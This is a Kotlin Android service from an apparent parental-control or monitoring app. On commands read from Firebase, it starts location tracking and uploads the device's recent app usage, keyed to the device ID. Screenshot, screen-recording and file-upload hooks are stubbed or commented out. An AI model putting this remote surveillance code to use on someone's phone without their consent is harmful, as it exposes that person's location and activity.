package com.example.toasty.services


import android.annotation.SuppressLint
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.compose.runtime.collectAsState
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.example.toasty.MainActivity
import com.example.toasty.MainActivity.Companion.childUserSnapShot
import com.example.toasty.MainActivity.Companion.mutableChildUserSnapShot
import com.example.toasty.common.CommonUtils
import com.example.toasty.models.User
import com.example.toasty.security.LocationMap
import com.example.toasty.workmanager.MyWorkerLastOpenedApps
import com.google.android.gms.tasks.Task
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking


class FirebaseDataService : Service() {

    companion object {
        private const val TAG: String = "FirebaseDataService"
        private var activity: Activity? = null
        lateinit var databaseReference: DatabaseReference
        private val deviceVersion: String = Build.VERSION.RELEASE
        val deviceInfo = Build.BRAND + "(Device:" + Build.MODEL + "_OS:" + deviceVersion + ")"
        var lastOpenedApp: Boolean = false

        fun startFirebaseDataService(activity: Activity) {
            val serviceIntent = Intent(activity, FirebaseDataService::class.java)
            ContextCompat.startForegroundService(activity, serviceIntent)
            FirebaseDataService.activity = activity
            Log.d(TAG, "FirebaseDataService Start")
        }

        fun stopFirebaseDataService(activity: Activity) {
            val serviceIntent = Intent(activity, FirebaseDataService::class.java)
            activity.stopService(serviceIntent)
            Log.d(TAG, "FirebaseDataService Stopped")
        }

    }

    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate call")
        startForegroundService()
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun startForegroundService() {
        val channelId = "location_service_channel"
        val notificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Create a notification channel for Android O and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Location Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }

        // Create the notification for the foreground service
        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle(TAG)
            .setContentText("Fetching $TAG in the background")
            .setSmallIcon(com.example.toasty.R.drawable.ic_launcher_foreground)
            .build()

        // Start the foreground service with the notification
        startForeground(
            1, notification,
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        )
        Log.d(TAG, "startForegroundService call")
    }

    override fun onBind(intent: Intent?): IBinder? {
        Log.d(TAG, "onBind call")
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Perform your task here (e.g., background work)
        Log.d(TAG, "onStartCommand call")
        CoroutineScope(Dispatchers.IO).launch {
            initFireBaseDB()
        }
        return START_STICKY // Restart the service if it is killed
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Background service is onDestroy")
    }

    @SuppressLint("HardwareIds")
    suspend fun initFireBaseDB() {
        val deviceUid =
            (deviceInfo + Settings.Secure.getString(
                activity?.contentResolver,
                Settings.Secure.ANDROID_ID
            )) ?: "Android"
        // Initialize Firebase Database reference
        databaseReference = FirebaseDatabase.getInstance().reference.child(deviceUid)
        writeData()
    }

    private suspend fun writeData() {
        databaseReference.child("user").get().addOnCompleteListener { task: Task<DataSnapshot> ->
            if (task.isSuccessful) {
                val snapshot = task.result
                if (snapshot.exists()) {
                    Log.d(TAG, "Child exists: " + snapshot.value)
                    activity?.let { realTimeUpdateData(it) }
                } else {
                    Log.d(TAG, "Child does not exist.")
                    CoroutineScope(Dispatchers.IO).launch {
                        updateUserData()
                        writeData()
                    }
                }
            } else {
                Log.e(TAG, "Error checking child: ", task.exception)
            }
        }
    }

    private suspend fun updateUserData() {
        childUserSnapShot.collect {
            Log.d(TAG, "Real-time child: updateUserData ${it.lastOpenedApp}")
            databaseReference.child("user").setValue(it)
        }
    }

    private fun realTimeUpdateData(activity: Activity) {
        // Real-time updates
        databaseReference.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    Log.d(TAG, "Real-time child: ${child.key}")
                    if (child.key.toString() == "images") {
                        //Log.d(TAG, "Real-time key: ${child.key}")
                        val screenshots = child.value as HashMap<*, *>
                        for (key in screenshots.values) {
                            //println("Real-time child: $key")
                            //imageScreenshot.setImageBitmap(decodeBase64ToBitmap(key.toString()))
                            break
                        }
                        //break
                    } else if (child.key.toString() == "locations") {
                        val date = CommonUtils.getCurrentDateTime()
                        val dateInString = CommonUtils.dateFormetter(date, "yyyy_MM_dd")
                        //val dateInString = "2025_01_06"
                        //Log.d(TAG, "Real-time location: ${child.child(dateInString).toString()}")
                        if (child.hasChild(dateInString)) {
                            val mapLatLong = child.child(dateInString).value as HashMap<*, *>
                            val listLatLong = ArrayList<String>()
                            for (key in mapLatLong.values) {
                                listLatLong.add(key.toString())
                                //Log.d(TAG, "Real-time mapLatLong: $key")
                            }
                            LocationMap.locations.value = listLatLong
                        }
                    } else if (child.key.toString() == "lastOpenedApp") {

                    } else if (child.key.toString() == "InstalledApps") {

                    } else {
                        val user = child.getValue(User::class.java)
                        if (user != null) {
                            MainActivity.mutableChildUserSnapShot.value = user

                            Log.d(TAG, "Real-time User: $lastOpenedApp $user")
                            // textViewStatus.text =
                            //     "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
                            /*                        if (user?.screenshotStart == true) {
                                                        recordScreen = false
                                                        if (checkAudioPermission(activity)) startScreenCapturing(activity)
                                                    } else if (user?.videoRecordingStart == true) {
                                                        recordScreen = true
                                                        if (checkAudioPermission(activity)) startScreenRecording(activity)
                                                    } else if (user?.screenshotStart == false || user?.videoRecordingStart == false) {
                                                        stopScreenRecording(activity)
                                                    }*/

                            if (user?.locationStart == true) {
                                LocationMapService.startLocationService(activity)
                                //LocationMap.onInit(activity)
                            } else {
                                LocationMapService.stopLocationService(activity)
                                //LocationMap.removeLocationUpdate()
                            }
                            if (user?.uploadDocuments == true) {

                            }
                            if (user?.uploadImages == true) {
                                CoroutineScope(Dispatchers.IO).launch {
                                    //imageReaderNew(directoriesWithImages)
                                }
                            }
                            if (user?.uploadVideos == true) {

                            }
                            if (user?.lastOpenedApp == true && lastOpenedApp) {
                                lastOpenedApp = false
                                callWorkManagerLastOpenedApp(activity)
                            } else {
                                //lastOpenedApp = true
                            }
                        }
                    }

                }
            }

            override fun onCancelled(error: DatabaseError) {
                println("Error: ${error.message}")
            }
        })
    }

    private fun callWorkManagerLastOpenedApp(context: Context) {
        // Enqueue the WorkRequest
        val workManager = WorkManager.getInstance(context)
        //workManager.cancelAllWorkByTag(TAG) // cancel previous running workmanager
        //workManager.cancelAllWork() // cancel all running workmanager
        val workRequest = OneTimeWorkRequestBuilder<MyWorkerLastOpenedApps>()
            .addTag(MyWorkerLastOpenedApps.TAG).build()
        workManager.enqueueUniqueWork(
            MyWorkerLastOpenedApps.TAG,
            ExistingWorkPolicy.REPLACE,
            workRequest
        )
        Log.d(TAG, "Work manager Started ${MyWorkerLastOpenedApps.TAG}")
        // Observe WorkManager's progress
        MainActivity.lifecycleOwner?.let {
            WorkManager.getInstance(context).getWorkInfoByIdLiveData(workRequest.id)
                .observe(it) { workInfo ->
                    if (workInfo != null && workInfo.state.isFinished) {
                        // Get output data
                        val resultCode = workInfo.outputData.getInt("resultCode", 0)
                        val result = workInfo.outputData.getString("resultData")
                        Log.d(TAG, "Work Finished: $resultCode $result")
                        if (resultCode > 0 && result != null) {
                            val gson = Gson()
                            // Get the JSON string from inputData
                            val type = object :
                                TypeToken<ArrayList<Triple<String?, String?, String?>>>() {}.type
                            val usageStatsList: ArrayList<Triple<String?, String?, String?>> =
                                gson.fromJson(result, type)
                            runBlocking {
                                findLastOpenedApps(usageStatsList)
                            }
                        }
                        //Toast.makeText(this, result, Toast.LENGTH_SHORT).show()
                    }
                }
        }
    }

    private suspend fun findLastOpenedApps(usageStatsList: ArrayList<Triple<String?, String?, String?>>) {
        // Find the last used app
        Log.d(TAG, "findLastOpenedApps start: ${usageStatsList?.size}")
        val job = kotlinx.coroutines.CoroutineScope(Dispatchers.IO).async {
            for (usageStats in usageStatsList) {
                Log.d(TAG, "findLastOpenedApps Last opened app: ${usageStats?.first}")
                databaseReference.child("lastOpenedApp")
                    .child(usageStats?.first.toString())
                databaseReference.child("lastOpenedApp")
                    .child(usageStats?.first.toString())
                    .child("totalTimeInForeground")
                    .setValue(usageStats?.second.toString())
                databaseReference.child("lastOpenedApp")
                    .child(usageStats?.first.toString())
                    .child("lastTimeUsed")
                    .setValue(usageStats?.third.toString())
            }
        }
        job.await()
        Log.d(TAG, "findLastOpenedApps finished")
    }
}
